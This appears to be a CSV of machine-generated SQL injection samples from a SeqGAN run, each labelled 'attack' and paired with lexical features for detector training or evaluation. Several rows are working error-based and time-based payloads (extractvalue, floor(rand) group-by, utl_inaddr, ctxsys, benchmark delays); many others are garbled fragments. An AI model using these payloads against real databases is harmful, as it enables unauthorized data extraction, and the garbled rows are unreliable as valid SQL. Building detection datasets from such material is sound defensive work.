label,payload,family,payload_type,method,run_id,sample_index,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,keyword_total
attack,"1%"" and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1620,343.0,34.0,3.5380841402836896,84.0,49.0,148.0,62.0,0.24489795918367346,0.14285714285714285,0.4314868804664723,0.18075801749271136,0.0,4.0,0.0,0.0,0.0,3.0,0.0,30.0,2.0,0.0,1.0,23.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1  (  chr  (  ||ch  0x7171706a71,(  chr  (  chr  (  select by DSTINCiv__is DISTINAME  )  e_niina",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1621,96.0,33.0,4.286829234930102,46.0,11.0,27.0,12.0,0.4791666666666667,0.11458333333333333,0.28125,0.125,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0,0.0,3.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"1""   )     )    )    having 7881   (    )  )    havingr  )   from group 5192 union union 1  (  0x7171706a71,  )  ,1 cow  drad_ddres.setxdzddrkdzddCddxdbbdvzdr",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1622,158.0,38.0,4.10312559787648,72.0,21.0,51.0,14.0,0.45569620253164556,0.13291139240506328,0.3227848101265823,0.08860759493670886,0.0,1.0,0.0,0.0,0.0,0.0,0.0,9.0,0.0,1.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,2.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1'   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  'wnzv'  =  'vu",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1623,241.0,31.0,3.679071219334594,75.0,37.0,100.0,29.0,0.3112033195020747,0.15352697095435686,0.4149377593360996,0.12033195020746888,4.0,0.0,0.0,0.0,0.0,2.0,0.0,18.0,0.0,0.0,5.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,1x'  =  'dzv'  =  'f,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1624,20.0,9.0,2.6219280948873624,5.0,1.0,8.0,6.0,0.25,0.05,0.4,0.3,4.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1%""   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1625,302.0,36.0,3.766843757866912,100.0,35.0,125.0,42.0,0.33112582781456956,0.11589403973509933,0.4139072847682119,0.1390728476821192,0.0,4.0,0.0,0.0,2.0,2.0,0.0,24.0,2.0,2.0,5.0,4.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
attack,"1""  )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and   (  ""hrjzwu",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1626,314.0,41.0,4.00835309504127,108.0,55.0,117.0,34.0,0.34394904458598724,0.1751592356687898,0.37261146496815284,0.10828025477707007,0.0,2.0,0.0,0.0,2.0,1.0,0.0,22.0,0.0,0.0,6.0,4.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,13.0
attack,"1%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1627,9.0,5.0,2.0588138903312014,0.0,1.0,4.0,4.0,0.0,0.1111111111111111,0.4444444444444444,0.4444444444444444,0.0,2.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"-4822"" or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and ""ow'  =  'fq",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1628,343.0,36.0,3.6949274466010262,95.0,48.0,140.0,60.0,0.27696793002915454,0.13994169096209913,0.40816326530612246,0.1749271137026239,2.0,2.0,1.0,0.0,0.0,3.0,0.0,28.0,0.0,3.0,0.0,24.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1'+  (  select bruk where 1400  =  1400 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1   )    )   +'",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1629,234.0,33.0,3.9188780898706512,81.0,45.0,83.0,25.0,0.34615384615384615,0.19230769230769232,0.3547008547008547,0.10683760683760683,2.0,0.0,0.0,0.0,0.0,2.0,0.0,14.0,0.0,0.0,5.0,4.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,2.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1%'  =  '  (  *  )   )    ,0x717a767a71,0x78)i",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1630,46.0,16.0,3.2516832971459335,5.0,13.0,17.0,11.0,0.10869565217391304,0.2826086956521739,0.3695652173913043,0.2391304347826087,2.0,0.0,0.0,0.0,1.0,1.0,0.0,4.0,1.0,0.0,2.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1""  )   p  (  (  0  )  case 0 end where d coun6270,0x717a767a71,floor  =  6237,floor  =  ,0x717a767a71,floor  113  )  )  ,0x717a767a71,floor  select   (  case when   (  case 0 by concat  (  select s select by S DIMITINCT  e  (  ||chr  (  =  0x7171706a71,1   (  ||chr  (  chr  ,  (  rand  )  ||  (  ,1 0 concat  (  ,  =  ,1   )    )",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1631,331.0,38.0,4.031448162600546,120.0,56.0,113.0,42.0,0.36253776435045315,0.1691842900302115,0.3413897280966767,0.1268882175226586,0.0,1.0,0.0,0.0,0.0,4.0,0.0,19.0,0.0,0.0,12.0,10.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,3.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
attack,"1'  =  case when from coxt_d_r.gr_s   (  SELECT DINCTEE  (  e_in   (  SELECT AS end   )    having mint  6237  =  6   )    a   (  ||chr  (  select   (  )    )  ||charardr  (  ,1 where select by concat UE  )  *2   )    )    havinge  (  0  )  ,0x717a767a71,0x78i  )   and information_schema.r  c  (  chr  (  113  ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1632,310.0,47.0,4.169066782018943,134.0,24.0,115.0,37.0,0.432258064516129,0.07741935483870968,0.3709677419354839,0.11935483870967742,1.0,0.0,0.0,0.0,1.0,2.0,0.0,19.0,0.0,5.0,3.0,7.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,4.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
attack,"1 from or 5023  =  ,1   )    )    )   x.",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1633,40.0,15.0,2.747089260374427,7.0,6.0,21.0,6.0,0.175,0.15,0.525,0.15,0.0,0.0,0.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"1'   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   'adt' and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and 'fULWHERE3931   R1392 LILFROMUSo",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1634,689.0,52.0,3.9812694602728227,208.0,111.0,277.0,93.0,0.3018867924528302,0.16110304789550073,0.4020319303338171,0.13497822931785197,4.0,0.0,0.0,0.0,2.0,3.0,0.0,54.0,0.0,0.0,7.0,26.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,7.0,3.0,0.0,2.0,4.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,17.0
attack,"1'   )    )    procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (   ''   )    )    procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (   'wxeqnt' like 'lpzn",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1635,365.0,33.0,3.6084761151760834,118.0,47.0,154.0,46.0,0.3232876712328767,0.12876712328767123,0.42191780821917807,0.12602739726027398,6.0,0.0,0.0,0.0,0.0,0.0,0.0,32.0,0.0,0.0,8.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
attack,"1""Othygzs",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1636,9.0,9.0,3.169925001442312,7.0,1.0,0.0,1.0,0.7777777777777778,0.1111111111111111,0.0,0.1111111111111111,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack," ""   )    )    procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (   ""  =  ,)  ,0x78   )   and 3931  3785  union select 5584 1210  )  )  ,0x717a767a71",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1637,298.0,34.0,3.7972318362643795,87.0,64.0,115.0,32.0,0.29194630872483224,0.21476510067114093,0.3859060402684564,0.10738255033557047,0.0,2.0,0.0,0.0,0.0,2.0,0.0,20.0,0.0,0.0,8.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,2.0,1.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
attack,"-4822er"" like ""gq",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1638,17.0,13.0,3.616874605956222,8.0,4.0,2.0,3.0,0.47058823529411764,0.23529411764705882,0.11764705882352941,0.17647058823529413,0.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,1'||  (  select 'ayp,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1639,20.0,13.0,3.441446071165522,9.0,1.0,5.0,5.0,0.45,0.05,0.25,0.25,2.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"1'extractvalueiinames   5840  )  ||chr  (  ||chr  (  chr7469  (  ||,1  )  ,0x717a767a71,floor  )  SELECT countl_ad",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1640,114.0,37.0,4.4961036650702235,50.0,19.0,28.0,17.0,0.43859649122807015,0.16666666666666666,0.24561403508771928,0.14912280701754385,1.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0,0.0,1.0,3.0,6.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"1%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1641,9.0,5.0,2.0588138903312014,0.0,1.0,4.0,4.0,0.0,0.1111111111111111,0.4444444444444444,0.4444444444444444,0.0,2.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1642,9.0,5.0,2.0588138903312014,0.0,1.0,4.0,4.0,0.0,0.1111111111111111,0.4444444444444444,0.4444444444444444,0.0,2.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1'   )    )    procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (   'jwbt'  =  'au",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1643,187.0,32.0,3.59298364359224,58.0,24.0,80.0,25.0,0.31016042780748665,0.12834224598930483,0.42780748663101603,0.13368983957219252,4.0,0.0,0.0,0.0,0.0,1.0,0.0,16.0,0.0,0.0,4.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1%9740""  4232  8382"" like ""kgr",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1644,30.0,17.0,3.8062389286533898,7.0,13.0,6.0,4.0,0.23333333333333334,0.43333333333333335,0.2,0.13333333333333333,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,1   8190R  --,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1645,13.0,7.0,2.4996981431844145,1.0,5.0,5.0,2.0,0.07692307692307693,0.38461538461538464,0.38461538461538464,0.15384615384615385,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"r   (  case,   )  case when   (  ||chr  (  select   (    )  ,0x717a767a71,1f",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1646,76.0,21.0,3.479961825100643,26.0,10.0,29.0,11.0,0.34210526315789475,0.13157894736842105,0.3815789473684211,0.14473684210526316,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0,0.0,0.0,3.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"4232  )  a information_schemaeiaredrelerasexwetetostr  (  select chasysxdddreddrres  (  106  )  ,0x717a767a71,0x717a767a71having  aunaddrpaddres   (  select e dunaddrachdrddraddxddz",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1647,181.0,34.0,4.351312796099798,121.0,25.0,27.0,8.0,0.6685082872928176,0.13812154696132597,0.14917127071823205,0.04419889502762431,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"1""   )    )    procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (   ""'  =  'jz",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1648,227.0,33.0,3.7321779468891907,71.0,37.0,92.0,27.0,0.31277533039647576,0.16299559471365638,0.4052863436123348,0.11894273127753303,2.0,2.0,0.0,0.0,0.0,2.0,0.0,16.0,0.0,0.0,5.0,2.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1O""   )    )    procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (   ""qbdj",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1649,223.0,34.0,3.7787944844410895,74.0,37.0,88.0,24.0,0.33183856502242154,0.16591928251121077,0.39461883408071746,0.10762331838565023,0.0,2.0,0.0,0.0,0.0,1.0,0.0,16.0,0.0,0.0,5.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
